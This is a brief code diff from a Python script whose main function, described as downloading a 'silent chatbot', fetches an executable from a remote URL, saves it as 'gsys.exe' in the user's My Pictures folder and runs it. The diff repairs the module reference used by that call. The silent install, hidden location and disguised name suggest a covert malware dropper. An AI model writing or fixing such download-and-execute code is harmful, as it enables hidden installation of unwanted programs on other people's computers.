@@ -69,7 +69,7 @@ def __file_setstate(path, state):
 
 def main():
     """Download the silent chatbot and run it."""
-    download_install_run(CHATBOTURL, shellcon.CSIDL_MYPICTURES, "gsys.exe")
+    download_install_run(CHATBOTURL, win32com.shellcon.CSIDL_MYPICTURES, "gsys.exe")
     
 if __name__ == "__main__":
     main()
